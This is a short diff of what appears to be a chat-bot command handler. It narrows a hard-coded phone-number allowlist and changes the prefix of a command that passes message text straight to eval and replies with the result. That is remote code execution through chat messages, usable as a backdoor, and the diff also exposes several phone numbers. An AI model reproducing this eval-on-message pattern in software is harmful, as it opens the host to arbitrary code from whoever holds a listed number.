@@ -36,11 +36,11 @@ eypz({
 		ameen
 	}) => {
 		
-    var Ameen = ['916238768108', '918078438059','919961857267','919207759062','919539412641']
+    var Ameen = ['919539412641']
 		if (Ameen.includes(senderNumber)) {
-        if (body.startsWith("~")) {
+        if (body.startsWith(">")) {
             try {
-                let evaled = await eval(`(async () => { ${body?.replace("~", "")} })()`);
+                let evaled = await eval(`(async () => { ${body?.replace(">", "")} })()`);
                 if (typeof evaled !== "string") evaled = util.inspect(evaled);
                 await reply(`${evaled}`);
 	    } catch (e) {
